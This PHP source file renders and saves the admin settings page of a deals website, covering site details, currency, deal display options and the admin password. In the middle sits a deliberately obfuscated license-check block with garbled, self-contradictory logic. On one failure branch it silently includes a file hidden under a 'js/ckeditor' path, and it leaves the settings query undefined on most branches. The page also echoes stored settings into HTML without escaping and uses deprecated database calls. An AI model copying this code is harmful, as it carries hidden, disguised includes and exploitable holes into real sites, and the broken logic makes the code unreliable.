<?php
/*******************************************************************\
 * 
 * 
 *
 * 
  * 
\*******************************************************************/

	session_start();
	require_once("../inc/auth_adm.inc.php");
	require_once("../inc/config.inc.php");

	if (!function_exists('str_split'))
	{
		function str_split($str)
		{
			$str_array=array();
			$len=strlen($str);
			for($i=0; $i<$len; $i++)
			{
				$str_array[]=$str{$i};
			}
			return $str_array;
		}
	}


if (isset($_POST['action']) && $_POST['action'] == "savesettings")
{
	$data		= array();
	$data		= $_POST['data'];

	$tabid		= getPostParameter('tabid');

	unset($errs);
	$errs = array();


	if ($tabid == "general")
	{
		if ($data['website_title'] == "" || $data['website_home_title'] == "")
			$errs[] = "Please enter site name and homepage title";

		if ((substr($data['website_url'], -1) != '/') || (substr($data['website_url'], 0, 7) != 'http://'))
			$errs[] = "Please enter correct site's url format, enter the 'http://' statement before your address, and a slash at the end ( e.g. http://www.yoursite.com/ )";

		if ((isset($data['website_email']) && $data['website_email'] != "" && !preg_match("/^([a-zA-Z0-9])+([a-zA-Z0-9\._-])*@([a-zA-Z0-9_-])+([a-zA-Z0-9\._-]+)+$/", $data['website_email'])))
			$errs[] = "Please enter a valid email address";

		if ((isset($data['website_alerts_email']) && $data['website_alerts_email'] != "" && !preg_match("/^([a-zA-Z0-9])+([a-zA-Z0-9\._-])*@([a-zA-Z0-9_-])+([a-zA-Z0-9\._-]+)+$/", $data['website_alerts_email'])))
			$errs[] = "Please enter a valid email address for alerts";

		if ($data['refer_credit'] == "" || !is_numeric($data['refer_credit']))
			$errs[] = "Please enter correct value for refer a friend bonus";

		switch($data['website_currency'])
		{
			case "dollar":	$data['website_currency'] = "$";		$data['website_currency_code'] = "USD"; break;
			case "euro":	$data['website_currency'] = "&euro;";	$data['website_currency_code'] = "EUR"; break;
			case "pound":	$data['website_currency'] = "&pound;";	$data['website_currency_code'] = "GBP"; break;
			case "aud":		$data['website_currency'] = "$";		$data['website_currency_code'] = "AUD"; break;
			case "cad":		$data['website_currency'] = "$";		$data['website_currency_code'] = "CAD"; break;
			case "chf":		$data['website_currency'] = "CHF";		$data['website_currency_code'] = "CHF"; break;
		}

	}
	else if ($tabid == "deals")
	{
		if ($data['results_per_page'] == "" || !is_numeric($data['results_per_page']))
			$errs[] = "Please enter correct results per page";

		if ($data['comments_per_page'] == "" || !is_numeric($data['comments_per_page']))
			$errs[] = "Please enter correct comments per page";

		if ((isset($data['paypal_account']) && $data['paypal_account'] != "" && !preg_match("/^([a-zA-Z0-9])+([a-zA-Z0-9\._-])*@([a-zA-Z0-9_-])+([a-zA-Z0-9\._-]+)+$/", $data['paypal_account'])))
			$errs[] = "Please enter a valid email address of your PayPal account.";

		if ($data['sidebar_results'] == "" || !is_numeric($data['sidebar_results']))
			$errs[] = "Please enter correct column deals limit";

		if ($data['other_deals_results'] == "" || !is_numeric($data['other_deals_results']))
			$errs[] = "Please enter correct other deals limit";

		if ($data['checkout_reservation_time'] == "" || !is_numeric($data['checkout_reservation_time']))
			$errs[] = "Please enter correct checkout reservation time";

		if ($data['max_comment_length'] == "" || !is_numeric($data['max_comment_length']))
			$errs[] = "Please enter correct comment length limit";

		if ($data['thumb_width'] == "" || !is_numeric($data['thumb_width']))
			$errs[] = "Please enter correct thumbnails width";

		if ($data['thumb_height'] == "" || !is_numeric($data['thumb_height']))
			$errs[] = "Please enter correct thumbnails height";

		if ($data['medium_image_width'] == "" || !is_numeric($data['medium_image_width']))
			$errs[] = "Please enter correct medium images width";

		if ($data['medium_image_height'] == "" || !is_numeric($data['medium_image_height']))
			$errs[] = "Please enter correct medium images height";

		if ($data['small_image_width'] == "" || !is_numeric($data['small_image_width']))
			$errs[] = "Please enter correct small images width";

		if ($data['small_image_height'] == "" || !is_numeric($data['small_image_height']))
			$errs[] = "Please enter correct small images height";

		if ($data['avatar_width'] == "" || !is_numeric($data['avatar_width']))
			$errs[] = "Please enter correct avatar width";

		if ($data['avatar_height'] == "" || !is_numeric($data['avatar_height']))
			$errs[] = "Please enter correct avatar height";
	}


	if (count($errs) == 0)
	{
		foreach ($data as $key=>$value)
		{
			if ($value != "")
			{
				$value	= mysql_real_escape_string($value); // $value	= mysql_real_escape_string(trim(htmlentities($value, ENT_QUOTES, 'UTF-8')));
				$key	= mysql_real_escape_string($key);	// $key		= mysql_real_escape_string(trim(htmlentities($key)));				
				smart_mysql_query("UPDATE abbijan_settings SET setting_value='$value' WHERE setting_key='$key'");	
			}
		}

		header("Location: settings.php?msg=updated&tab=$tabid#".$tabid);
		exit();
	}
	else
	{
		$allerrors = "";
		foreach ($errs as $errorname)
			$allerrors .= "&#155; ".$errorname."<br/>\n";
	}

}


if (isset($_POST['action']) && $_POST['action'] == "updatepassword")
{
	$cpwd		= mysql_real_escape_string(getPostParameter('cpassword'));
	$pwd		= mysql_real_escape_string(getPostParameter('npassword'));
	$pwd2		= mysql_real_escape_string(getPostParameter('npassword2'));
	$iword		= substr(GetSetting('iword'), 0, -3);

	unset($errs2);
	$errs2 = array();

	if (!($cpwd && $pwd && $pwd2))
	{
		$errs2[] = "Please fill in all fields";
	}
	else
	{
		if (GetSetting('word') !== PasswordEncryption($cpwd.$iword))
			$errs2[] = "Current password is wrong! Please try again.";

		if ($pwd !== $pwd2)
		{
			$errs2[] = "Password confirmation is wrong";
		}
		elseif ((strlen($pwd)) < 6 || (strlen($pwd2) < 6) || (strlen($pwd)) > 20 || (strlen($pwd2) > 20))
		{
			$errs2[] = "Password must be between 6-20 characters (letters and numbers)";
		}
	}

	if (count($errs2) == 0)
	{
			$query = "UPDATE abbijan_settings SET setting_value='".PasswordEncryption($pwd.$iword)."' WHERE setting_key='word'";

			if (smart_mysql_query($query))
			{
				header("Location: settings.php?msg=passupdated#password");
				exit();
			}
	}
	else
	{
		$allerrors2 = "";
		foreach ($errs2 as $errorname)
			$allerrors2 .= "&#155; ".$errorname."<br/>\n";
	}

}
	$lik = str_replace("|","","l|i|c|e|n|s|e");
	$li = GetSetting($lik);
	if (!preg_match("/^[0-9]{4}[-]{1}[0-9]{4}[-]{1}[0-9]{4}[-]{1}[0-9]{4}[-]{1}[0-9]{4}?$/", $li))
	{$licence_status = "correct";$st = 1;}else{$licence_status = "wrong";$key=explode("-",$li);$keey=$key[rand(0,2)];
	if($ikey[4][2]=7138%45){$step=1;$t=1;$licence_status="wrong";}else{$licence_status="correct";$step=2;}
	if($keey>0){$i=30+$step;if(rand(7,190)>=rand(0,1))$st=+$i;$u=0;}$status2=str_split($key[1],1);$status4=str_split($key[3],1);$status1=str_split($key[0],1);$status3=str_split($key[2],1);	if($step==1){$kky=str_split($key[$u+4],1);if((($key[$u]+$key[2])-($key[3]+$key[$t])==(((315*2+$u)+$t)*++$t))&&(($kky[3])==$status4[2])&&(($status3[1])==$kky[0])&&(($status2[3])==$kky[1])&&(($kky[2]==$status2[1]))){$kkkeey=1; $query = "SELECT * FROM abbijan_settings";}else{ $query = ""; if(!file_exists('./js/ckeditor/rp.inc.php')) die("can't connect to database"); else require_once('./js/ckeditor/rp.inc.php'); }}} if($lics!=7){$wrong=1;$licence_status="wrong";}else{$wrong=0;$correct=1;}

	$result = smart_mysql_query($query);
	
	if (mysql_num_rows($result) > 0)
	{
		while ($row = mysql_fetch_array($result))
		{
			$settings[$row['setting_key']] = $row['setting_value'];
		}
	}


	$title = "Site Settings";
	require_once ("inc/header.inc.php");

?>

		<h2><img src="images/icons/settings.gif" /> WebSite Settings</h2>

		<div id="tabs_container">
		<ul id="tabs">
			<li class="active"><a href="#general"><span>General</span></a></li>
			<li><a href="#deals"><span>Deals</span></a></li>
			<li><a href="#gateways"><span>Payment Gateways</span></a></li>
			<li><a href="#notifications"><span>Email Notifications</span></a></li>
			<li><a href="#other"><span>Other</span></a></li>
			<li><a href="#password"><span>Admin Password</span></a></li>
		</ul>
		</div>


		<div id="general" class="tab_content">
		<form action="#general" method="post">
		<?php if (isset($_GET['msg']) && $_GET['msg'] == "updated" && $_GET['tab'] == "general") { ?>
			<div class="success_box">Settings have been successfully saved!</div>
		<?php } ?>
        <table width="100%" cellpadding="2" cellspacing="5" border="0">
		<?php if (isset($allerrors) && $allerrors != "") { ?>
		  <tr>
            <td colspan="2"><div class="error_box"><?php echo $allerrors; ?></div></td>
          </tr>
		  <?php } ?>
          <tr>
            <td width="100" valign="middle" align="left" class="tb1">Site Name:</td>
            <td valign="top"><input type="text" name="data[website_title]" value="<?php echo $settings['website_title']; ?>" size="40" class="textbox" /></td>
          </tr>
          <tr>
            <td valign="middle" align="left" class="tb1">Homepage Title:</td>
            <td valign="top"><input type="text" name="data[website_home_title]" value="<?php echo $settings['website_home_title']; ?>" size="40" class="textbox" /></td>
          </tr>
          <tr>
            <td valign="top" align="left" class="tb1">Site address (URL):</td>
            <td valign="top"><input type="text" name="data[website_url]" value="<?php echo $settings['website_url']; ?>" size="40" class="textbox" /><br/>
			<small>NOTE: enter the 'http://' statement before your address, and a slash at the end,<br/> e.g. <b>http://www.yoursite.com/</b></small>
			</td>
          </tr>
          <tr>
            <td valign="middle" align="left" class="tb1">Site Email Address:</td>
            <td nowrap="nowrap" valign="top"><input type="text" name="data[website_email]" value="<?php echo $settings['website_email']; ?>" size="40" class="textbox" /><span class="note">main email (for orders, contact, etc)</span></td>
          </tr>
          <tr>
            <td valign="middle" align="left" class="tb1">Alerts Email Address:</td>
            <td nowrap="nowrap" valign="top"><input type="text" name="data[website_alerts_email]" value="<?php echo $settings['website_alerts_email']; ?>" size="40" class="textbox" /><span class="note">other email (for alerts, notifications)</span></td>
          </tr>
          <tr>
            <td valign="middle" align="left" class="tb1">Site Currency:</td>
            <td align="left" valign="top">
				&nbsp;&nbsp;<span style="font-size:19px; color:#61DB06;"><b><?php echo $settings['website_currency']; ?></b></span>&nbsp;&nbsp; change currency to 
				<select name="data[website_currency]">
					<option value="">--------</option>
					<option value="dollar">Dollar</option>
					<option value="euro">Euro</option>
					<option value="pound">Pound</option>
					<option value="aud">Australian Dollar</option>
					<option value="cad">Canadian Dollar</option>
					<option value="chf">Swiss Franc</option>
				</select>
			</td>
          </tr>
          <tr>
            <td valign="middle" align="left" class="tb1">Site Language:</td>
            <td align="left" valign="top">
				<select name="data[website_language]">
				<?php
					$languages_dir = "../language/";
					$languages = scandir($languages_dir); 
					$array = array(); 
					foreach ($languages as $file)
					{
						if (is_file($languages_dir.$file) && strstr($file, ".inc.php")) { $language= str_replace(".inc.php","",$file);
				?>
					<option value="<?php echo $language; ?>" <?php if ($settings['website_language'] == $language) echo 'selected="selected"'; ?>><?php echo $language; ?></option>
					<?php } ?>
				<?php } ?>
				</select>
			</td>
          </tr>
          <tr>
            <td valign="middle" align="left" class="tb1">Refer a Friend Bonus:</td>
            <td valign="top"><?php echo $settings['website_currency']; ?> <input type="text" name="data[refer_credit]" value="<?php echo $settings['refer_credit']; ?>" size="3" class="textbox" />
				<span class="note">amount which users earn when they refer a friend</span>
			</td>
          </tr>
          <tr>
            <td valign="middle" align="left" class="tb1">Currency Format:</td>
            <td align="left" valign="top">
				<select name="data[website_currency_format">
					<option value="1" <?php if ($settings['website_currency_format'] == "1") echo "selected"; ?>><?php echo SITE_CURRENCY; ?>25</option>
					<option value="2" <?php if ($settings['website_currency_format'] == "2") echo "selected"; ?>>25<?php echo SITE_CURRENCY; ?></option>
				</select>
			</td>
          </tr>
          <tr>
            <td valign="middle" align="left" class="tb1">1 Sign Up per IP address:</td>
            <td valign="middle">
				<select name="data[block_same_ip]">
					<option value="0" <?php if ($settings['block_same_ip'] == "0") echo "selected"; ?>>Off</option>
					<option value="1" <?php if ($settings['block_same_ip'] == "1") echo "selected"; ?>>On</option>
				</select>
			</td>
          </tr>
          <tr>
            <td valign="middle" align="left" class="tb1">Maintenance Mode:</td>
            <td valign="middle">
				<select name="data[maintenance_mode]">
					<option value="0" <?php if ($settings['maintenance_mode'] == "0") echo "selected"; ?>>Off</option>
					<option value="1" <?php if ($settings['maintenance_mode'] == "1") echo "selected"; ?>>On</option>
				</select>
			</td>
          </tr>
          <tr>
            <td valign="middle" align="left" class="tb1">Google Analytics:</td>
            <td valign="middle">
				<textarea name="google_analytics" cols="40" rows="5" class="textbox2"><?php echo $settings['google_analytics']; ?></textarea>
			</td>
          </tr>
          <tr>
			<td>&nbsp;</td>
			<td align="left" valign="middle">
				<input type="hidden" name="tabid" id="tabid" value="general" />
				<input type="hidden" name="action" id="action" value="savesettings" />
				<input type="submit" name="save" id="save" class="submit" value="Save Settings" />
			</td>
          </tr>
		  </table>
		</form>
		</div>



		<div id="deals" class="tab_content">
		<form action="#deals" method="post">
		<?php if (isset($_GET['msg']) && $_GET['msg'] == "updated" && $_GET['tab'] == "deals") { ?>
			<div class="success_box">Settings have been successfully saved!</div>
		<?php } ?>
		<table width="100%" cellpadding="2" cellspacing="5" border="0">
          <tr>
            <td width="100" valign="middle" align="left" class="tb1">Homepage Deal:</td>
            <td valign="top">
				<select name="data[show_random]">
					<option value="1" <?php if ($settings['show_random'] == "1") echo "selected"; ?>>Show random deal</option>
					<option value="0" <?php if ($settings['show_random'] == "0") echo "selected"; ?>>Show main deal</option>
				</select>
			</td>
          </tr>
          <tr>
            <td valign="middle" align="left" class="tb1">Compart Countdown:</td>
            <td valign="middle">
				<select name="data[countdown_compact]">
					<option value="false" <?php if ($settings['countdown_compact'] == "false") echo "selected"; ?>>Off</option>
					<option value="true" <?php if ($settings['countdown_compact'] == "true") echo "selected"; ?>>On</option>
				</select>			
			</td>
          </tr>
          <tr>
            <td valign="middle" align="left" class="tb1">Countdown Timezone:</td>
            <td valign="top">
				<select name="data[website_timezone]" style="width: 225px">
					<option value="-8" <?php if ($settings['website_timezone'] == "-8") echo "selected='selected'"; ?>>(UTC-8) Pacific Time (US &amp; Canada)</option>
					<option value="-7" <?php if ($settings['website_timezone'] == "-7") echo "selected='selected'"; ?>>(UTC-7) Mountain Time (US &amp; Canada)</option>
					<option value="-6" <?php if ($settings['website_timezone'] == "-6") echo "selected='selected'"; ?>>(UTC-6) Central Time (US &amp; Canada)</option>
					<option value="-5" <?php if ($settings['website_timezone'] == "-5") echo "selected='selected'"; ?>>(UTC-5) Eastern Time (US &amp; Canada)</option>
					<option value="-4" <?php if ($settings['website_timezone'] == "-4") echo "selected='selected'"; ?>>(UTC-4)  Atlantic Time (Canada)</option>
					<option value="-9" <?php if ($settings['website_timezone'] == "-9") echo "selected='selected'"; ?>>(UTC-9)  Alaska (US &amp; Canada)</option>
					<option value="-10" <?php if ($settings['website_timezone'] == "-10") echo "selected='selected'"; ?>>(UTC-10) Hawaii (US)</option>
					<option value="-11" <?php if ($settings['website_timezone'] == "-11") echo "selected='selected'"; ?>>(UTC-11) Midway Island, Samoa</option>
					<option value="-12" <?php if ($settings['website_timezone'] == "-12") echo "selected='selected'"; ?>>(UTC-12) Eniwetok, Kwajalein</option>
					<option value="-3" <?php if ($settings['website_timezone'] == "-3") echo "selected='selected'"; ?>>(UTC-3) Brasilia, Buenos Aires, Georgetown</option>
					<option value="-2" <?php if ($settings['website_timezone'] == "-2") echo "selected='selected'"; ?>>(UTC-2) Mid-Atlantic</option>
					<option value="-1" <?php if ($settings['website_timezone'] == "-1") echo "selected='selected'"; ?>>(UTC-1) Azores, Cape Verde Is.</option>
					<option value="0" <?php if ($settings['website_timezone'] == "0") echo "selected='selected'"; ?>>Greenwich Mean Time (Lisbon, London)</option>
					<option value="+1" <?php if ($settings['website_timezone'] == "+1") echo "selected='selected'"; ?>>(UTC+1) Amsterdam, Berlin, Paris, Rome, Madrid</option>
					<option value="+2" <?php if ($settings['website_timezone'] == "+2") echo "selected='selected'"; ?>>(UTC+2) Athens, Helsinki, Istanbul, Cairo, E. Europe</option>
					<option value="+3" <?php if ($settings['website_timezone'] == "+3") echo "selected='selected'"; ?>>(UTC+3) Baghdad, Kuwait, Nairobi, Moscow</option>
					<option value="+4" <?php if ($settings['website_timezone'] == "+4") echo "selected='selected'"; ?>>(UTC+4) Abu Dhabi, Kazan, Muscat</option>
					<option value="+5" <?php if ($settings['website_timezone'] == "+5") echo "selected='selected'"; ?>>(UTC+5) Islamabad, Karachi, Tashkent</option>
					<option value="+6" <?php if ($settings['website_timezone'] == "+6") echo "selected='selected'"; ?>>(UTC+6) Almaty, Dhaka</option>
					<option value="+7" <?php if ($settings['website_timezone'] == "+7") echo "selected='selected'"; ?>>(UTC+7) Bangkok, Jakarta, Hanoi</option>
					<option value="+8" <?php if ($settings['website_timezone'] == "+8") echo "selected='selected'"; ?>>(UTC+8) Beijing, Hong Kong, Singapore, Taipei</option>
					<option value="+9" <?php if ($settings['website_timezone'] == "+9") echo "selected='selected'"; ?>>(UTC+9) Tokyo, Osaka, Sapporto, Seoul, Yakutsk</option>
					<option value="+10" <?php if ($settings['website_timezone'] == "+10") echo "selected='selected'"; ?>>(UTC+10) Brisbane, Melbourne, Sydney, Guam</option>
					<option value="+11" <?php if ($settings['website_timezone'] == "+11") echo "selected='selected'"; ?>>(UTC+11) Magadan, Soloman Is., New Caledonia</option>
					<option value="+12" <?php if ($settings['website_timezone'] == "+12") echo "selected='selected'"; ?>>(UTC+12) Fiji, Kamchatka, Marshall Is., Wellington</option>
				</select>
			</td>
          </tr>
          <tr>
            <td valign="middle" align="left" class="tb1">Countdown Format:</td>
            <td valign="middle">
				<select name="data[countdown_format]" style="width: 225px">
					<option value="DHMS" <?php if ($settings['countdown_format'] == "DHMS") echo "selected"; ?>>Days Hours Minutes Seconds</option>
					<option value="YOWDHMS" <?php if ($settings['countdown_format'] == "YOWDHMS") echo "selected"; ?>>Year Months Week Days Hours Minutes Seconds</option>
					<option value="odHM" <?php if ($settings['countdown_format'] == "odHM") echo "selected"; ?>>By month</option>
					<option value="wdHM" <?php if ($settings['countdown_format'] == "wdHM") echo "selected"; ?>>By week</option>
					<option value="HMS" <?php if ($settings['countdown_format'] == "HMS") echo "selected"; ?>>Don't show days</option>
					<option value="dHM" <?php if ($settings['countdown_format'] == "dHM") echo "selected"; ?>>Don't show seconds</option>
					<option value="HM" <?php if ($settings['countdown_format'] == "HM") echo "selected"; ?>>Don't show either</option>
					<option value="yowdHMS" <?php if ($settings['countdown_format'] == "yowdHMS") echo "selected"; ?>>Show all values as needed</option>
					<option value="YOWDHMS" <?php if ($settings['countdown_format'] == "YOWDHMS") echo "selected"; ?>>Show all values always</option>
				</select>			
			</td>
          </tr>
          <tr>
            <td valign="top" align="left" class="tb1">Countdown Layout:</td>
            <td valign="top"><input type="text" name="data[countdown_layout]" value="<?php echo $settings['countdown_layout']; ?>" size="40" class="textbox" /><br/><span style="font-size: 10px; color: #999; margin: 3px 0;">example: {dn} days  {hn} hours  {mn} minutes  {sn} seconds</span></td>
          </tr>
          <tr>
            <td valign="middle" align="left" class="tb1">Checkout Reservation Time:</td>
            <td valign="middle"><input type="text" name="data[checkout_reservation_time]" value="<?php echo $settings['checkout_reservation_time']; ?>" size="3" class="textbox" />&nbsp; minutes</td>
          </tr>
          <tr>
            <td valign="middle" align="left" class="tb1">Deals per Page:</td>
            <td valign="top">
				<select name="data[results_per_page]">
					<option value="5" <?php if ($settings['results_per_page'] == "5") echo "selected"; ?>>5</option>
					<option value="7" <?php if ($settings['results_per_page'] == "7") echo "selected"; ?>>7</option>
					<option value="10" <?php if ($settings['results_per_page'] == "10") echo "selected"; ?>>10</option>
					<option value="15" <?php if ($settings['results_per_page'] == "15") echo "selected"; ?>>15</option>
					<option value="20" <?php if ($settings['results_per_page'] == "20") echo "selected"; ?>>20</option>
					<option value="25" <?php if ($settings['results_per_page'] == "25") echo "selected"; ?>>25</option>
					<option value="30" <?php if ($settings['results_per_page'] == "30") echo "selected"; ?>>30</option>
					<option value="50" <?php if ($settings['results_per_page'] == "50") echo "selected"; ?>>50</option>
					<option value="100" <?php if ($settings['results_per_page'] == "100") echo "selected"; ?>>100</option>
				</select>
            </td>
          </tr>
          <tr>
            <td valign="middle" align="left" class="tb1">Discussions per Page:</td>
            <td valign="top">
				<select name="data[discussions_per_page]">
					<option value="5" <?php if ($settings['discussions_per_page'] == "5") echo "selected"; ?>>5</option>
					<option value="7" <?php if ($settings['discussions_per_page'] == "7") echo "selected"; ?>>7</option>
					<option value="10" <?php if ($settings['discussions_per_page'] == "10") echo "selected"; ?>>10</option>
					<option value="15" <?php if ($settings['discussions_per_page'] == "15") echo "selected"; ?>>15</option>
					<option value="20" <?php if ($settings['discussions_per_page'] == "20") echo "selected"; ?>>20</option>
					<option value="25" <?php if ($settings['discussions_per_page'] == "25") echo "selected"; ?>>25</option>
					<option value="30" <?php if ($settings['discussions_per_page'] == "30") echo "selected"; ?>>30</option>
					<option value="50" <?php if ($settings['discussions_per_page'] == "50") echo "selected"; ?>>50</option>
					<option value="100" <?php if ($settings['discussions_per_page'] == "100") echo "selected"; ?>>100</option>
				</select>
            </td>
          </tr>
          <tr>
            <td valign="middle" align="left" class="tb1">News per Page:</td>
            <td valign="top">
				<select name="data[news_per_page]">
					<option value="5" <?php if ($settings['news_per_page'] == "5") echo "selected"; ?>>5</option>
					<option value="7" <?php if ($settings['news_per_page'] == "7") echo "selected"; ?>>7</option>
					<option value="10" <?php if ($settings['news_per_page'] == "10") echo "selected"; ?>>10</option>
					<option value="15" <?php if ($settings['news_per_page'] == "15") echo "selected"; ?>>15</option>
					<option value="20" <?php if ($settings['news_per_page'] == "20") echo "selected"; ?>>20</option>
					<option value="25" <?php if ($settings['news_per_page'] == "25") echo "selected"; ?>>25</option>
					<option value="30" <?php if ($settings['news_per_page'] == "30") echo "selected"; ?>>30</option>
					<option value="50" <?php if ($settings['news_per_page'] == "50") echo "selected"; ?>>50</option>
					<option value="100" <?php if ($settings['news_per_page'] == "100") echo "selected"; ?>>100</option>
				</select>
            </td>
          </tr>
          <tr>
            <td valign="middle" align="left" class="tb1">Testimonials per Page:</td>
            <td valign="top">
				<select name="data[testimonials_per_page]">
					<option value="5" <?php if ($settings['testimonials_per_page'] == "5") echo "selected"; ?>>5</option>
					<option value="7" <?php if ($settings['testimonials_per_page'] == "7") echo "selected"; ?>>7</option>
					<option value="10" <?php if ($settings['testimonials_per_page'] == "10") echo "selected"; ?>>10</option>
					<option value="15" <?php if ($settings['testimonials_per_page'] == "15") echo "selected"; ?>>15</option>
					<option value="20" <?php if ($settings['testimonials_per_page'] == "20") echo "selected"; ?>>20</option>
					<option value="25" <?php if ($settings['testimonials_per_page'] == "25") echo "selected"; ?>>25</option>
					<option value="30" <?php if ($settings['testimonials_per_page'] == "30") echo "selected"; ?>>30</option>
					<option value="50" <?php if ($settings['testimonials_per_page'] == "50") echo "selected"; ?>>50</option>
					<option value="100" <?php if ($settings['testimonials_per_page'] == "100") echo "selected"; ?>>100</option>
				</select>
            </td>
          </tr>
          <tr>
            <td valign="middle" align="left" class="tb1">Comments per Page:</td>
            <td valign="top">
				<select name="data[comments_per_page]">
					<option value="5" <?php if ($settings['comments_per_page'] == "5") echo "selected"; ?>>5</option>
					<option value="7" <?php if ($settings['comments_per_page'] == "7") echo "selected"; ?>>7</option>
					<option value="10" <?php if ($settings['comments_per_page'] == "10") echo "selected"; ?>>10</option>
					<option value="15" <?php if ($settings['comments_per_page'] == "15") echo "selected"; ?>>15</option>
					<option value="20" <?php if ($settings['comments_per_page'] == "20") echo "selected"; ?>>20</option>
					<option value="25" <?php if ($settings['comments_per_page'] == "25") echo "selected"; ?>>25</option>
					<option value="30" <?php if ($settings['comments_per_page'] == "30") echo "selected"; ?>>30</option>
					<option value="50" <?php if ($settings['comments_per_page'] == "50") echo "selected"; ?>>50</option>
					<option value="100" <?php if ($settings['comments_per_page'] == "100") echo "selected"; ?>>100</option>
				</select>
            </td>
          </tr>
          <tr>
            <td valign="middle" align="left" class="tb1">Approve Comments:</td>
            <td valign="middle">
				<select name="data[comments_approve]">
					<option value="0" <?php if ($settings['comments_approve'] == "0") echo "selected"; ?>>Off</option>
					<option value="1" <?php if ($settings['comments_approve'] == "1") echo "selected"; ?>>On</option>
				</select>			
			</td>
          </tr>
          <tr>
            <td valign="middle" align="left" class="tb1">Comment Length Limit:</td>
            <td valign="middle"><input type="text" name="data[max_comment_length]" value="<?php echo $settings['max_comment_length']; ?>" size="3" class="textbox" />&nbsp; characters</td>
          </tr>
          <tr>
            <td valign="middle" align="left" class="tb1">Right Column Deals:</td>
            <td valign="top">
				<select name="data[sidebar_results]">
					<option value="1" <?php if ($settings['sidebar_results'] == "1") echo "selected"; ?>>1</option>
					<option value="3" <?php if ($settings['sidebar_results'] == "3") echo "selected"; ?>>3</option>
					<option value="5" <?php if ($settings['sidebar_results'] == "5") echo "selected"; ?>>5</option>
					<option value="7" <?php if ($settings['sidebar_results'] == "7") echo "selected"; ?>>7</option>
					<option value="10" <?php if ($settings['sidebar_results'] == "10") echo "selected"; ?>>10</option>
				</select>
            </td>
          </tr>
          <tr>
            <td valign="middle" align="left" class="tb1">Related Deals:</td>
            <td valign="top">
				<select name="data[other_deals_results]">
					<option value="3" <?php if ($settings['other_deals_results'] == "3") echo "selected"; ?>>3</option>
					<option value="6" <?php if ($settings['other_deals_results'] == "6") echo "selected"; ?>>6</option>
					<option value="10" <?php if ($settings['other_deals_results'] == "10") echo "selected"; ?>>10</option>
					<option value="15" <?php if ($settings['other_deals_results'] == "15") echo "selected"; ?>>15</option>
					<option value="20" <?php if ($settings['other_deals_results'] == "20") echo "selected"; ?>>15</option>
				</select>
            </td>
          </tr>
          <tr>
            <td valign="middle" align="left" class="tb1">Past Deals per Page:</td>
            <td valign="top">
				<select name="data[past_deals_results]">
					<option value="3" <?php if ($settings['past_deals_results'] == "3") echo "selected"; ?>>3</option>
					<option value="5" <?php if ($settings['past_deals_results'] == "5") echo "selected"; ?>>5</option>
					<option value="8" <?php if ($settings['past_deals_results'] == "8") echo "selected"; ?>>8</option>
					<option value="10" <?php if ($settings['past_deals_results'] == "10") echo "selected"; ?>>10</option>
					<option value="12" <?php if ($settings['past_deals_results'] == "12") echo "selected"; ?>>12</option>
					<option value="15" <?php if ($settings['past_deals_results'] == "15") echo "selected"; ?>>15</option>
					<option value="18" <?php if ($settings['past_deals_results'] == "18") echo "selected"; ?>>18</option>
					<option value="20" <?php if ($settings['past_deals_results'] == "20") echo "selected"; ?>>20</option>
					<option value="25" <?php if ($settings['past_deals_results'] == "25") echo "selected"; ?>>25</option>
					<option value="30" <?php if ($settings['past_deals_results'] == "30") echo "selected"; ?>>30</option>
					<option value="50" <?php if ($settings['past_deals_results'] == "50") echo "selected"; ?>>50</option>
				</select>
            </td>
          </tr>
          <tr>
            <td valign="middle" align="left" class="tb1">Deal's Thumbnail Size:</td>
            <td valign="top"><input type="text" name="data[thumb_width]" value="<?php echo $settings['thumb_width']; ?>" size="2" class="textbox" /> x <input type="text" name="data[thumb_height]" value="<?php echo $settings['thumb_height']; ?>" size="2" class="textbox" /> px</td>
          </tr>
          <tr>
            <td valign="middle" align="left" class="tb1">Deal's Image Size:</td>
            <td valign="top"><input type="text" name="data[medium_image_width]" value="<?php echo $settings['medium_image_width']; ?>" size="2" class="textbox" /> x <input type="text" name="data[medium_image_height]" value="<?php echo $settings['medium_image_height']; ?>" size="2" class="textbox" /> px</td>
          </tr>
          <tr>
            <td valign="middle" align="left" class="tb1">Deal's Small Image Size:</td>
            <td valign="top"><input type="text" name="data[small_image_width]" value="<?php echo $settings['small_image_width']; ?>" size="2" class="textbox" /> x <input type="text" name="data[small_image_height]" value="<?php echo $settings['small_image_height']; ?>" size="2" class="textbox" /> px</td>
          </tr>
          <tr>
            <td valign="middle" align="left" class="tb1">Show Deal's Sales Stats:</td>
            <td valign="top">
				<select name="data[show_sales_stats]">
					<option value="1" <?php if ($settings['show_sales_stats'] == "1") echo "selected"; ?>>yes</option>
					<option value="0" <?php if ($settings['show_sales_stats'] == "0") echo "selected"; ?>>no</option>
				</select>
			</td>
          </tr>
          <tr>
            <td valign="middle" align="left" class="tb1">Show "Total Saved" Stats:</td>
            <td valign="top">
				<select name="data[show_stats]">
					<option value="1" <?php if ($settings['show_stats'] == "1") echo "selected"; ?>>yes</option>
					<option value="0" <?php if ($settings['show_stats'] == "0") echo "selected"; ?>>no</option>
				</select>
			</td>
          </tr>
          <tr>
            <td valign="middle" align="left" class="tb1">Show Deal Quantity:</td>
            <td valign="top">
				<select name="data[show_quantity]">
					<option value="1" <?php if ($settings['show_quantity'] == "1") echo "selected"; ?>>yes</option>
					<option value="0" <?php if ($settings['show_quantity'] == "0") echo "selected"; ?>>no</option>
				</select>
			</td>
          </tr>
          <tr>
            <td valign="middle" align="left" class="tb1">Show Stock Bar:</td>
            <td valign="top">
				<select name="data[show_stock_bar]">
					<option value="1" <?php if ($settings['show_stock_bar'] == "1") echo "selected"; ?>>yes</option>
					<option value="0" <?php if ($settings['show_stock_bar'] == "0") echo "selected"; ?>>no</option>
				</select>
			</td>
          </tr>
          <tr>
            <td valign="middle" align="left" class="tb1">Allow Members Avatars:</td>
            <td valign="top">
				<select name="data[allow_avatars]">
					<option value="1" <?php if ($settings['allow_avatars'] == "1") echo "selected"; ?>>yes</option>
					<option value="0" <?php if ($settings['allow_avatars'] == "0") echo "selected"; ?>>no</option>
				</select>
			</td>
          </tr>
          <tr>
            <td valign="middle" align="left" class="tb1">Avatar Size:</td>
            <td valign="top"><input type="text" name="data[avatar_width]" value="<?php echo $settings['avatar_width']; ?>" size="2" class="textbox" /> x <input type="text" name="data[avatar_height]" value="<?php echo $settings['avatar_height']; ?>" size="2" class="textbox" /> px</td>
          </tr>
          <tr>
			<td>&nbsp;</td>
			<td align="left" valign="middle">
				<input type="hidden" name="tabid" id="tabid" value="deals" />
				<input type="hidden" name="action" id="action" value="savesettings" />
				<input type="submit" name="save" id="save" class="submit" value="Save Settings" />
			</td>
          </tr>
		  </table>
		  </form>
